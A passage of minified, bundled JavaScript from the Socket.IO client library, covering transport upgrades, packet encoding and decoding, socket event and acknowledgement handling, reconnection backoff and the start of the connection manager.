            $31ec253f4133d168$export$4798917dbf149b79.priorWebsocketSuccess = "websocket" === transport.name, 
            this.transport.pause((() => {
              failed || "closed" !== this.readyState && (cleanup(), this.setTransport(transport), 
              transport.send([ {
                type: "upgrade"
              } ]), this.emitReserved("upgrade", transport), transport = null, this.upgrading = !1, 
              this.flush());
            }));
          } else {
            const err = new Error("probe error");
            err.transport = transport.name, this.emitReserved("upgradeError", err);
          }
        })));
      };
      function freezeTransport() {
        failed || (failed = !0, cleanup(), transport.close(), transport = null);
      }
      const onerror = err => {
        const error = new Error("probe error: " + err);
        error.transport = transport.name, freezeTransport(), this.emitReserved("upgradeError", error);
      };
      function onTransportClose() {
        onerror("transport closed");
      }
      function onclose() {
        onerror("socket closed");
      }
      function onupgrade(to) {
        transport && to.name !== transport.name && freezeTransport();
      }
      const cleanup = () => {
        transport.removeListener("open", onTransportOpen), transport.removeListener("error", onerror), 
        transport.removeListener("close", onTransportClose), this.off("close", onclose), 
        this.off("upgrading", onupgrade);
      };
      transport.once("open", onTransportOpen), transport.once("error", onerror), transport.once("close", onTransportClose), 
      this.once("close", onclose), this.once("upgrading", onupgrade), -1 !== this.upgrades.indexOf("webtransport") && "webtransport" !== name ? this.setTimeoutFn((() => {
        failed || transport.open();
      }), 200) : transport.open();
    }
    onOpen() {
      if (this.readyState = "open", $31ec253f4133d168$export$4798917dbf149b79.priorWebsocketSuccess = "websocket" === this.transport.name, 
      this.emitReserved("open"), this.flush(), "open" === this.readyState && this.opts.upgrade) {
        let i = 0;
        const l = this.upgrades.length;
        for (;i < l; i++) this.probe(this.upgrades[i]);
      }
    }
    onPacket(packet) {
      if ("opening" === this.readyState || "open" === this.readyState || "closing" === this.readyState) switch (this.emitReserved("packet", packet), 
      this.emitReserved("heartbeat"), this.resetPingTimeout(), packet.type) {
       case "open":
        this.onHandshake(JSON.parse(packet.data));
        break;

       case "ping":
        this.sendPacket("pong"), this.emitReserved("ping"), this.emitReserved("pong");
        break;

       case "error":
        const err = new Error("server error");
        err.code = packet.data, this.onError(err);
        break;

       case "message":
        this.emitReserved("data", packet.data), this.emitReserved("message", packet.data);
      }
    }
    onHandshake(data) {
      this.emitReserved("handshake", data), this.id = data.sid, this.transport.query.sid = data.sid, 
      this.upgrades = this.filterUpgrades(data.upgrades), this.pingInterval = data.pingInterval, 
      this.pingTimeout = data.pingTimeout, this.maxPayload = data.maxPayload, this.onOpen(), 
      "closed" !== this.readyState && this.resetPingTimeout();
    }
    resetPingTimeout() {
      this.clearTimeoutFn(this.pingTimeoutTimer), this.pingTimeoutTimer = this.setTimeoutFn((() => {
        this.onClose("ping timeout");
      }), this.pingInterval + this.pingTimeout), this.opts.autoUnref && this.pingTimeoutTimer.unref();
    }
    onDrain() {
      this.writeBuffer.splice(0, this.prevBufferLen), this.prevBufferLen = 0, 0 === this.writeBuffer.length ? this.emitReserved("drain") : this.flush();
    }
    flush() {
      if ("closed" !== this.readyState && this.transport.writable && !this.upgrading && this.writeBuffer.length) {
        const packets = this.getWritablePackets();
        this.transport.send(packets), this.prevBufferLen = packets.length, this.emitReserved("flush");
      }
    }
    getWritablePackets() {
      if (!(this.maxPayload && "polling" === this.transport.name && this.writeBuffer.length > 1)) return this.writeBuffer;
      let payloadSize = 1;
      for (let i = 0; i < this.writeBuffer.length; i++) {
        const data = this.writeBuffer[i].data;
        if (data && (payloadSize += "string" == typeof (obj = data) ? function(str) {
          let c = 0, length = 0;
          for (let i = 0, l = str.length; i < l; i++) c = str.charCodeAt(i), c < 128 ? length += 1 : c < 2048 ? length += 2 : c < 55296 || c >= 57344 ? length += 3 : (i++, 
          length += 4);
          return length;
        }(obj) : Math.ceil(1.33 * (obj.byteLength || obj.size))), i > 0 && payloadSize > this.maxPayload) return this.writeBuffer.slice(0, i);
        payloadSize += 2;
      }
      var obj;
      return this.writeBuffer;
    }
    write(msg, options, fn) {
      return this.sendPacket("message", msg, options, fn), this;
    }
    send(msg, options, fn) {
      return this.sendPacket("message", msg, options, fn), this;
    }
    sendPacket(type, data, options, fn) {
      if ("function" == typeof data && (fn = data, data = void 0), "function" == typeof options && (fn = options, 
      options = null), "closing" === this.readyState || "closed" === this.readyState) return;
      (options = options || {}).compress = !1 !== options.compress;
      const packet = {
        type: type,
        data: data,
        options: options
      };
      this.emitReserved("packetCreate", packet), this.writeBuffer.push(packet), fn && this.once("flush", fn), 
      this.flush();
    }
    close() {
      const close = () => {
        this.onClose("forced close"), this.transport.close();
      }, cleanupAndClose = () => {
        this.off("upgrade", cleanupAndClose), this.off("upgradeError", cleanupAndClose), 
        close();
      }, waitForUpgrade = () => {
        this.once("upgrade", cleanupAndClose), this.once("upgradeError", cleanupAndClose);
      };
      return "opening" !== this.readyState && "open" !== this.readyState || (this.readyState = "closing", 
      this.writeBuffer.length ? this.once("drain", (() => {
        this.upgrading ? waitForUpgrade() : close();
      })) : this.upgrading ? waitForUpgrade() : close()), this;
    }
    onError(err) {
      $31ec253f4133d168$export$4798917dbf149b79.priorWebsocketSuccess = !1, this.emitReserved("error", err), 
      this.onClose("transport error", err);
    }
    onClose(reason, description) {
      "opening" !== this.readyState && "open" !== this.readyState && "closing" !== this.readyState || (this.clearTimeoutFn(this.pingTimeoutTimer), 
      this.transport.removeAllListeners("close"), this.transport.close(), this.transport.removeAllListeners(), 
      "function" == typeof removeEventListener && (removeEventListener("beforeunload", this.beforeunloadEventListener, !1), 
      removeEventListener("offline", this.offlineEventListener, !1)), this.readyState = "closed", 
      this.id = null, this.emitReserved("close", reason, description), this.writeBuffer = [], 
      this.prevBufferLen = 0);
    }
    filterUpgrades(upgrades) {
      const filteredUpgrades = [];
      let i = 0;
      const j = upgrades.length;
      for (;i < j; i++) ~this.transports.indexOf(upgrades[i]) && filteredUpgrades.push(upgrades[i]);
      return filteredUpgrades;
    }
  }
  $31ec253f4133d168$export$4798917dbf149b79.protocol = 4;
  $31ec253f4133d168$export$4798917dbf149b79.protocol;
  function $f092beba6c67ff59$export$128fa18b7194ef(uri, path = "", loc) {
    let obj = uri;
    loc = loc || "undefined" != typeof location && location, null == uri && (uri = loc.protocol + "//" + loc.host), 
    "string" == typeof uri && ("/" === uri.charAt(0) && (uri = "/" === uri.charAt(1) ? loc.protocol + uri : loc.host + uri), 
    /^(https?|wss?):\/\//.test(uri) || (uri = void 0 !== loc ? loc.protocol + "//" + uri : "https://" + uri), 
    obj = $d2a3565fdc57be10$export$98e6a39c04603d36(uri)), obj.port || (/^(http|ws)$/.test(obj.protocol) ? obj.port = "80" : /^(http|ws)s$/.test(obj.protocol) && (obj.port = "443")), 
    obj.path = obj.path || "/";
    const host = -1 !== obj.host.indexOf(":") ? "[" + obj.host + "]" : obj.host;
    return obj.id = obj.protocol + "://" + host + ":" + obj.port + path, obj.href = obj.protocol + "://" + host + (loc && loc.port === obj.port ? "" : ":" + obj.port), 
    obj;
  }
  var $5e3c2c7e0dc43cee$exports = {};
  $parcel$export($5e3c2c7e0dc43cee$exports, "protocol", (function() {
    return $5e3c2c7e0dc43cee$export$a51d6b395ff4c65a;
  })), $parcel$export($5e3c2c7e0dc43cee$exports, "PacketType", (function() {
    return $5e3c2c7e0dc43cee$export$84d4095e16c6fc19;
  })), $parcel$export($5e3c2c7e0dc43cee$exports, "Encoder", (function() {
    return $5e3c2c7e0dc43cee$export$a50aceb0e02a00aa;
  })), $parcel$export($5e3c2c7e0dc43cee$exports, "Decoder", (function() {
    return $5e3c2c7e0dc43cee$export$f9de6ca0bc043724;
  }));
  const $6d786adbb10a231e$var$withNativeArrayBuffer = "function" == typeof ArrayBuffer, $6d786adbb10a231e$var$isView = obj => "function" == typeof ArrayBuffer.isView ? ArrayBuffer.isView(obj) : obj.buffer instanceof ArrayBuffer, $6d786adbb10a231e$var$toString = Object.prototype.toString, $6d786adbb10a231e$var$withNativeBlob = "function" == typeof Blob || "undefined" != typeof Blob && "[object BlobConstructor]" === $6d786adbb10a231e$var$toString.call(Blob), $6d786adbb10a231e$var$withNativeFile = "function" == typeof File || "undefined" != typeof File && "[object FileConstructor]" === $6d786adbb10a231e$var$toString.call(File);
  function $6d786adbb10a231e$export$37488ff1135b1696(obj) {
    return $6d786adbb10a231e$var$withNativeArrayBuffer && (obj instanceof ArrayBuffer || $6d786adbb10a231e$var$isView(obj)) || $6d786adbb10a231e$var$withNativeBlob && obj instanceof Blob || $6d786adbb10a231e$var$withNativeFile && obj instanceof File;
  }
  function $6d786adbb10a231e$export$5234c529abdb5610(obj, toJSON) {
    if (!obj || "object" != typeof obj) return !1;
    if (Array.isArray(obj)) {
      for (let i = 0, l = obj.length; i < l; i++) if ($6d786adbb10a231e$export$5234c529abdb5610(obj[i])) return !0;
      return !1;
    }
    if ($6d786adbb10a231e$export$37488ff1135b1696(obj)) return !0;
    if (obj.toJSON && "function" == typeof obj.toJSON && 1 === arguments.length) return $6d786adbb10a231e$export$5234c529abdb5610(obj.toJSON(), !0);
    for (const key in obj) if (Object.prototype.hasOwnProperty.call(obj, key) && $6d786adbb10a231e$export$5234c529abdb5610(obj[key])) return !0;
    return !1;
  }
  function $ddc1c4f542409445$export$ac2edb9eb7af56f6(packet) {
    const buffers = [], packetData = packet.data, pack = packet;
    return pack.data = $ddc1c4f542409445$var$_deconstructPacket(packetData, buffers), 
    pack.attachments = buffers.length, {
      packet: pack,
      buffers: buffers
    };
  }
  function $ddc1c4f542409445$var$_deconstructPacket(data, buffers) {
    if (!data) return data;
    if ($6d786adbb10a231e$export$37488ff1135b1696(data)) {
      const placeholder = {
        _placeholder: !0,
        num: buffers.length
      };
      return buffers.push(data), placeholder;
    }
    if (Array.isArray(data)) {
      const newData = new Array(data.length);
      for (let i = 0; i < data.length; i++) newData[i] = $ddc1c4f542409445$var$_deconstructPacket(data[i], buffers);
      return newData;
    }
    if ("object" == typeof data && !(data instanceof Date)) {
      const newData = {};
      for (const key in data) Object.prototype.hasOwnProperty.call(data, key) && (newData[key] = $ddc1c4f542409445$var$_deconstructPacket(data[key], buffers));
      return newData;
    }
    return data;
  }
  function $ddc1c4f542409445$export$a00da3b1ec037a04(packet, buffers) {
    return packet.data = $ddc1c4f542409445$var$_reconstructPacket(packet.data, buffers), 
    delete packet.attachments, packet;
  }
  function $ddc1c4f542409445$var$_reconstructPacket(data, buffers) {
    if (!data) return data;
    if (data && !0 === data._placeholder) {
      if ("number" == typeof data.num && data.num >= 0 && data.num < buffers.length) return buffers[data.num];
      throw new Error("illegal attachments");
    }
    if (Array.isArray(data)) for (let i = 0; i < data.length; i++) data[i] = $ddc1c4f542409445$var$_reconstructPacket(data[i], buffers); else if ("object" == typeof data) for (const key in data) Object.prototype.hasOwnProperty.call(data, key) && (data[key] = $ddc1c4f542409445$var$_reconstructPacket(data[key], buffers));
    return data;
  }
  const $5e3c2c7e0dc43cee$var$RESERVED_EVENTS = [ "connect", "connect_error", "disconnect", "disconnecting", "newListener", "removeListener" ], $5e3c2c7e0dc43cee$export$a51d6b395ff4c65a = 5;
  var $5e3c2c7e0dc43cee$export$84d4095e16c6fc19, PacketType1;
  (PacketType1 = $5e3c2c7e0dc43cee$export$84d4095e16c6fc19 || ($5e3c2c7e0dc43cee$export$84d4095e16c6fc19 = {}))[PacketType1.CONNECT = 0] = "CONNECT", 
  PacketType1[PacketType1.DISCONNECT = 1] = "DISCONNECT", PacketType1[PacketType1.EVENT = 2] = "EVENT", 
  PacketType1[PacketType1.ACK = 3] = "ACK", PacketType1[PacketType1.CONNECT_ERROR = 4] = "CONNECT_ERROR", 
  PacketType1[PacketType1.BINARY_EVENT = 5] = "BINARY_EVENT", PacketType1[PacketType1.BINARY_ACK = 6] = "BINARY_ACK";
  class $5e3c2c7e0dc43cee$export$a50aceb0e02a00aa {
    constructor(replacer) {
      this.replacer = replacer;
    }
    encode(obj) {
      return obj.type !== $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.EVENT && obj.type !== $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.ACK || !$6d786adbb10a231e$export$5234c529abdb5610(obj) ? [ this.encodeAsString(obj) ] : this.encodeAsBinary({
        type: obj.type === $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.EVENT ? $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.BINARY_EVENT : $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.BINARY_ACK,
        nsp: obj.nsp,
        data: obj.data,
        id: obj.id
      });
    }
    encodeAsString(obj) {
      let str = "" + obj.type;
      return obj.type !== $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.BINARY_EVENT && obj.type !== $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.BINARY_ACK || (str += obj.attachments + "-"), 
      obj.nsp && "/" !== obj.nsp && (str += obj.nsp + ","), null != obj.id && (str += obj.id), 
      null != obj.data && (str += JSON.stringify(obj.data, this.replacer)), str;
    }
    encodeAsBinary(obj) {
      const deconstruction = $ddc1c4f542409445$export$ac2edb9eb7af56f6(obj), pack = this.encodeAsString(deconstruction.packet), buffers = deconstruction.buffers;
      return buffers.unshift(pack), buffers;
    }
  }
  function $5e3c2c7e0dc43cee$var$isObject(value) {
    return "[object Object]" === Object.prototype.toString.call(value);
  }
  class $5e3c2c7e0dc43cee$export$f9de6ca0bc043724 extends $2f158107a3ddb7c6$export$4293555f241ae35a {
    constructor(reviver) {
      super(), this.reviver = reviver;
    }
    add(obj) {
      let packet;
      if ("string" == typeof obj) {
        if (this.reconstructor) throw new Error("got plaintext data when reconstructing a packet");
        packet = this.decodeString(obj);
        const isBinaryEvent = packet.type === $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.BINARY_EVENT;
        isBinaryEvent || packet.type === $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.BINARY_ACK ? (packet.type = isBinaryEvent ? $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.EVENT : $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.ACK, 
        this.reconstructor = new $5e3c2c7e0dc43cee$var$BinaryReconstructor(packet), 0 === packet.attachments && super.emitReserved("decoded", packet)) : super.emitReserved("decoded", packet);
      } else {
        if (!$6d786adbb10a231e$export$37488ff1135b1696(obj) && !obj.base64) throw new Error("Unknown type: " + obj);
        if (!this.reconstructor) throw new Error("got binary data when not reconstructing a packet");
        packet = this.reconstructor.takeBinaryData(obj), packet && (this.reconstructor = null, 
        super.emitReserved("decoded", packet));
      }
    }
    decodeString(str) {
      let i = 0;
      const p = {
        type: Number(str.charAt(0))
      };
      if (void 0 === $5e3c2c7e0dc43cee$export$84d4095e16c6fc19[p.type]) throw new Error("unknown packet type " + p.type);
      if (p.type === $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.BINARY_EVENT || p.type === $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.BINARY_ACK) {
        const start = i + 1;
        for (;"-" !== str.charAt(++i) && i != str.length; ) ;
        const buf = str.substring(start, i);
        if (buf != Number(buf) || "-" !== str.charAt(i)) throw new Error("Illegal attachments");
        p.attachments = Number(buf);
      }
      if ("/" === str.charAt(i + 1)) {
        const start = i + 1;
        for (;++i; ) {
          if ("," === str.charAt(i)) break;
          if (i === str.length) break;
        }
        p.nsp = str.substring(start, i);
      } else p.nsp = "/";
      const next = str.charAt(i + 1);
      if ("" !== next && Number(next) == next) {
        const start = i + 1;
        for (;++i; ) {
          const c = str.charAt(i);
          if (null == c || Number(c) != c) {
            --i;
            break;
          }
          if (i === str.length) break;
        }
        p.id = Number(str.substring(start, i + 1));
      }
      if (str.charAt(++i)) {
        const payload = this.tryParse(str.substr(i));
        if (!$5e3c2c7e0dc43cee$export$f9de6ca0bc043724.isPayloadValid(p.type, payload)) throw new Error("invalid payload");
        p.data = payload;
      }
      return p;
    }
    tryParse(str) {
      try {
        return JSON.parse(str, this.reviver);
      } catch (e) {
        return !1;
      }
    }
    static isPayloadValid(type, payload) {
      switch (type) {
       case $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.CONNECT:
        return $5e3c2c7e0dc43cee$var$isObject(payload);

       case $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.DISCONNECT:
        return void 0 === payload;

       case $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.CONNECT_ERROR:
        return "string" == typeof payload || $5e3c2c7e0dc43cee$var$isObject(payload);

       case $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.EVENT:
       case $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.BINARY_EVENT:
        return Array.isArray(payload) && ("number" == typeof payload[0] || "string" == typeof payload[0] && -1 === $5e3c2c7e0dc43cee$var$RESERVED_EVENTS.indexOf(payload[0]));

       case $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.ACK:
       case $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.BINARY_ACK:
        return Array.isArray(payload);
      }
    }
    destroy() {
      this.reconstructor && (this.reconstructor.finishedReconstruction(), this.reconstructor = null);
    }
  }
  class $5e3c2c7e0dc43cee$var$BinaryReconstructor {
    constructor(packet) {
      this.packet = packet, this.buffers = [], this.reconPack = packet;
    }
    takeBinaryData(binData) {
      if (this.buffers.push(binData), this.buffers.length === this.reconPack.attachments) {
        const packet = $ddc1c4f542409445$export$a00da3b1ec037a04(this.reconPack, this.buffers);
        return this.finishedReconstruction(), packet;
      }
      return null;
    }
    finishedReconstruction() {
      this.reconPack = null, this.buffers = [];
    }
  }
  function $8240814a8034c217$export$af631764ddc44097(obj, ev, fn) {
    return obj.on(ev, fn), function() {
      obj.off(ev, fn);
    };
  }
  const $f18f717745336096$var$RESERVED_EVENTS = Object.freeze({
    connect: 1,
    connect_error: 1,
    disconnect: 1,
    disconnecting: 1,
    newListener: 1,
    removeListener: 1
  });
  class $f18f717745336096$export$4798917dbf149b79 extends $2f158107a3ddb7c6$export$4293555f241ae35a {
    constructor(io, nsp, opts) {
      super(), this.connected = !1, this.recovered = !1, this.receiveBuffer = [], this.sendBuffer = [], 
      this._queue = [], this._queueSeq = 0, this.ids = 0, this.acks = {}, this.flags = {}, 
      this.io = io, this.nsp = nsp, opts && opts.auth && (this.auth = opts.auth), this._opts = Object.assign({}, opts), 
      this.io._autoConnect && this.open();
    }
    get disconnected() {
      return !this.connected;
    }
    subEvents() {
      if (this.subs) return;
      const io = this.io;
      this.subs = [ $8240814a8034c217$export$af631764ddc44097(io, "open", this.onopen.bind(this)), $8240814a8034c217$export$af631764ddc44097(io, "packet", this.onpacket.bind(this)), $8240814a8034c217$export$af631764ddc44097(io, "error", this.onerror.bind(this)), $8240814a8034c217$export$af631764ddc44097(io, "close", this.onclose.bind(this)) ];
    }
    get active() {
      return !!this.subs;
    }
    connect() {
      return this.connected || (this.subEvents(), this.io._reconnecting || this.io.open(), 
      "open" === this.io._readyState && this.onopen()), this;
    }
    open() {
      return this.connect();
    }
    send(...args) {
      return args.unshift("message"), this.emit.apply(this, args), this;
    }
    emit(ev, ...args) {
      if ($f18f717745336096$var$RESERVED_EVENTS.hasOwnProperty(ev)) throw new Error('"' + ev.toString() + '" is a reserved event name');
      if (args.unshift(ev), this._opts.retries && !this.flags.fromQueue && !this.flags.volatile) return this._addToQueue(args), 
      this;
      const packet = {
        type: $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.EVENT,
        data: args,
        options: {}
      };
      if (packet.options.compress = !1 !== this.flags.compress, "function" == typeof args[args.length - 1]) {
        const id = this.ids++, ack = args.pop();
        this._registerAckCallback(id, ack), packet.id = id;
      }
      const isTransportWritable = this.io.engine && this.io.engine.transport && this.io.engine.transport.writable;
      return this.flags.volatile && (!isTransportWritable || !this.connected) || (this.connected ? (this.notifyOutgoingListeners(packet), 
      this.packet(packet)) : this.sendBuffer.push(packet)), this.flags = {}, this;
    }
    _registerAckCallback(id, ack) {
      var _a;
      const timeout = null !== (_a = this.flags.timeout) && void 0 !== _a ? _a : this._opts.ackTimeout;
      if (void 0 === timeout) return void (this.acks[id] = ack);
      const timer = this.io.setTimeoutFn((() => {
        delete this.acks[id];
        for (let i = 0; i < this.sendBuffer.length; i++) this.sendBuffer[i].id === id && this.sendBuffer.splice(i, 1);
        ack.call(this, new Error("operation has timed out"));
      }), timeout);
      this.acks[id] = (...args) => {
        this.io.clearTimeoutFn(timer), ack.apply(this, [ null, ...args ]);
      };
    }
    emitWithAck(ev, ...args) {
      const withErr = void 0 !== this.flags.timeout || void 0 !== this._opts.ackTimeout;
      return new Promise(((resolve, reject) => {
        args.push(((arg1, arg2) => withErr ? arg1 ? reject(arg1) : resolve(arg2) : resolve(arg1))), 
        this.emit(ev, ...args);
      }));
    }
    _addToQueue(args) {
      let ack;
      "function" == typeof args[args.length - 1] && (ack = args.pop());
      const packet = {
        id: this._queueSeq++,
        tryCount: 0,
        pending: !1,
        args: args,
        flags: Object.assign({
          fromQueue: !0
        }, this.flags)
      };
      args.push(((err, ...responseArgs) => {
        if (packet !== this._queue[0]) return;
        return null !== err ? packet.tryCount > this._opts.retries && (this._queue.shift(), 
        ack && ack(err)) : (this._queue.shift(), ack && ack(null, ...responseArgs)), packet.pending = !1, 
        this._drainQueue();
      })), this._queue.push(packet), this._drainQueue();
    }
    _drainQueue(force = !1) {
      if (!this.connected || 0 === this._queue.length) return;
      const packet = this._queue[0];
      packet.pending && !force || (packet.pending = !0, packet.tryCount++, this.flags = packet.flags, 
      this.emit.apply(this, packet.args));
    }
    packet(packet) {
      packet.nsp = this.nsp, this.io._packet(packet);
    }
    onopen() {
      "function" == typeof this.auth ? this.auth((data => {
        this._sendConnectPacket(data);
      })) : this._sendConnectPacket(this.auth);
    }
    _sendConnectPacket(data) {
      this.packet({
        type: $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.CONNECT,
        data: this._pid ? Object.assign({
          pid: this._pid,
          offset: this._lastOffset
        }, data) : data
      });
    }
    onerror(err) {
      this.connected || this.emitReserved("connect_error", err);
    }
    onclose(reason, description) {
      this.connected = !1, delete this.id, this.emitReserved("disconnect", reason, description);
    }
    onpacket(packet) {
      if (packet.nsp === this.nsp) switch (packet.type) {
       case $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.CONNECT:
        packet.data && packet.data.sid ? this.onconnect(packet.data.sid, packet.data.pid) : this.emitReserved("connect_error", new Error("It seems you are trying to reach a Socket.IO server in v2.x with a v3.x client, but they are not compatible (more information here: https://socket.io/docs/v3/migrating-from-2-x-to-3-0/)"));
        break;

       case $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.EVENT:
       case $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.BINARY_EVENT:
        this.onevent(packet);
        break;

       case $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.ACK:
       case $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.BINARY_ACK:
        this.onack(packet);
        break;

       case $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.DISCONNECT:
        this.ondisconnect();
        break;

       case $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.CONNECT_ERROR:
        this.destroy();
        const err = new Error(packet.data.message);
        err.data = packet.data.data, this.emitReserved("connect_error", err);
      }
    }
    onevent(packet) {
      const args = packet.data || [];
      null != packet.id && args.push(this.ack(packet.id)), this.connected ? this.emitEvent(args) : this.receiveBuffer.push(Object.freeze(args));
    }
    emitEvent(args) {
      if (this._anyListeners && this._anyListeners.length) {
        const listeners = this._anyListeners.slice();
        for (const listener of listeners) listener.apply(this, args);
      }
      super.emit.apply(this, args), this._pid && args.length && "string" == typeof args[args.length - 1] && (this._lastOffset = args[args.length - 1]);
    }
    ack(id) {
      const self = this;
      let sent = !1;
      return function(...args) {
        sent || (sent = !0, self.packet({
          type: $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.ACK,
          id: id,
          data: args
        }));
      };
    }
    onack(packet) {
      const ack = this.acks[packet.id];
      "function" == typeof ack && (ack.apply(this, packet.data), delete this.acks[packet.id]);
    }
    onconnect(id, pid) {
      this.id = id, this.recovered = pid && this._pid === pid, this._pid = pid, this.connected = !0, 
      this.emitBuffered(), this.emitReserved("connect"), this._drainQueue(!0);
    }
    emitBuffered() {
      this.receiveBuffer.forEach((args => this.emitEvent(args))), this.receiveBuffer = [], 
      this.sendBuffer.forEach((packet => {
        this.notifyOutgoingListeners(packet), this.packet(packet);
      })), this.sendBuffer = [];
    }
    ondisconnect() {
      this.destroy(), this.onclose("io server disconnect");
    }
    destroy() {
      this.subs && (this.subs.forEach((subDestroy => subDestroy())), this.subs = void 0), 
      this.io._destroy(this);
    }
    disconnect() {
      return this.connected && this.packet({
        type: $5e3c2c7e0dc43cee$export$84d4095e16c6fc19.DISCONNECT
      }), this.destroy(), this.connected && this.onclose("io client disconnect"), this;
    }
    close() {
      return this.disconnect();
    }
    compress(compress) {
      return this.flags.compress = compress, this;
    }
    get volatile() {
      return this.flags.volatile = !0, this;
    }
    timeout(timeout) {
      return this.flags.timeout = timeout, this;
    }
    onAny(listener) {
      return this._anyListeners = this._anyListeners || [], this._anyListeners.push(listener), 
      this;
    }
    prependAny(listener) {
      return this._anyListeners = this._anyListeners || [], this._anyListeners.unshift(listener), 
      this;
    }
    offAny(listener) {
      if (!this._anyListeners) return this;
      if (listener) {
        const listeners = this._anyListeners;
        for (let i = 0; i < listeners.length; i++) if (listener === listeners[i]) return listeners.splice(i, 1), 
        this;
      } else this._anyListeners = [];
      return this;
    }
    listenersAny() {
      return this._anyListeners || [];
    }
    onAnyOutgoing(listener) {
      return this._anyOutgoingListeners = this._anyOutgoingListeners || [], this._anyOutgoingListeners.push(listener), 
      this;
    }
    prependAnyOutgoing(listener) {
      return this._anyOutgoingListeners = this._anyOutgoingListeners || [], this._anyOutgoingListeners.unshift(listener), 
      this;
    }
    offAnyOutgoing(listener) {
      if (!this._anyOutgoingListeners) return this;
      if (listener) {
        const listeners = this._anyOutgoingListeners;
        for (let i = 0; i < listeners.length; i++) if (listener === listeners[i]) return listeners.splice(i, 1), 
        this;
      } else this._anyOutgoingListeners = [];
      return this;
    }
    listenersAnyOutgoing() {
      return this._anyOutgoingListeners || [];
    }
    notifyOutgoingListeners(packet) {
      if (this._anyOutgoingListeners && this._anyOutgoingListeners.length) {
        const listeners = this._anyOutgoingListeners.slice();
        for (const listener of listeners) listener.apply(this, packet.data);
      }
    }
  }
  function $cc30906d7e5c1de3$export$2d38012449449c89(opts) {
    opts = opts || {}, this.ms = opts.min || 100, this.max = opts.max || 1e4, this.factor = opts.factor || 2, 
    this.jitter = opts.jitter > 0 && opts.jitter <= 1 ? opts.jitter : 0, this.attempts = 0;
  }
  $cc30906d7e5c1de3$export$2d38012449449c89.prototype.duration = function() {
    var ms = this.ms * Math.pow(this.factor, this.attempts++);
    if (this.jitter) {
      var rand = Math.random(), deviation = Math.floor(rand * this.jitter * ms);
      ms = 0 == (1 & Math.floor(10 * rand)) ? ms - deviation : ms + deviation;
    }
    return 0 | Math.min(ms, this.max);
  }, $cc30906d7e5c1de3$export$2d38012449449c89.prototype.reset = function() {
    this.attempts = 0;
  }, $cc30906d7e5c1de3$export$2d38012449449c89.prototype.setMin = function(min) {
    this.ms = min;
  }, $cc30906d7e5c1de3$export$2d38012449449c89.prototype.setMax = function(max) {
    this.max = max;
  }, $cc30906d7e5c1de3$export$2d38012449449c89.prototype.setJitter = function(jitter) {
    this.jitter = jitter;
  };
  class $e05edb0afebbc061$export$d0d38e7dec7a1a61 extends $2f158107a3ddb7c6$export$4293555f241ae35a {
    constructor(uri, opts) {
      var _a;
      super(), this.nsps = {}, this.subs = [], uri && "object" == typeof uri && (opts = uri, 
      uri = void 0), (opts = opts || {}).path = opts.path || "/socket.io", this.opts = opts, 
      $69315e998f85aa77$export$2f67576668b97183(this, opts), this.reconnection(!1 !== opts.reconnection), 
      this.reconnectionAttempts(opts.reconnectionAttempts || 1 / 0), this.reconnectionDelay(opts.reconnectionDelay || 1e3), 
      this.reconnectionDelayMax(opts.reconnectionDelayMax || 5e3), this.randomizationFactor(null !== (_a = opts.randomizationFactor) && void 0 !== _a ? _a : .5), 
      this.backoff = new $cc30906d7e5c1de3$export$2d38012449449c89({
        min: this.reconnectionDelay(),
        max: this.reconnectionDelayMax(),
        jitter: this.randomizationFactor()
      }), this.timeout(null == opts.timeout ? 2e4 : opts.timeout), this._readyState = "closed", 
      this.uri = uri;
      const _parser = opts.parser || $5e3c2c7e0dc43cee$exports;
      this.encoder = new _parser.Encoder, this.decoder = new _parser.Decoder, this._autoConnect = !1 !== opts.autoConnect, 
      this._autoConnect && this.open();
    }
    reconnection(v) {
      return arguments.length ? (this._reconnection = !!v, this) : this._reconnection;
    }
    reconnectionAttempts(v) {
      return void 0 === v ? this._reconnectionAttempts : (this._reconnectionAttempts = v, 
      this);
    }
    reconnectionDelay(v) {
      var _a;
      return void 0 === v ? this._reconnectionDelay : (this._reconnectionDelay = v, null === (_a = this.backoff) || void 0 === _a || _a.setMin(v), 
      this);
    }
    randomizationFactor(v) {
      var _a;
      return void 0 === v ? this._randomizationFactor : (this._randomizationFactor = v, 
      null === (_a = this.backoff) || void 0 === _a || _a.setJitter(v), this);
    }
    reconnectionDelayMax(v) {
      var _a;
      return void 0 === v ? this._reconnectionDelayMax : (this._reconnectionDelayMax = v, 
      null === (_a = this.backoff) || void 0 === _a || _a.setMax(v), this);
    }
    timeout(v) {
      return arguments.length ? (this._timeout = v, this) : this._timeout;
    }
    maybeReconnectOnOpen() {
      !this._reconnecting && this._reconnection && 0 === this.backoff.attempts && this.reconnect();
    }
    open(fn) {
      if (~this._readyState.indexOf("open")) return this;
      this.engine = new $31ec253f4133d168$export$4798917dbf149b79(this.uri, this.opts);
      const socket = this.engine, self = this;
      this._readyState = "opening", this.skipReconnect = !1;
      const openSubDestroy = $8240814a8034c217$export$af631764ddc44097(socket, "open", (function() {
        self.onopen(), fn && fn();
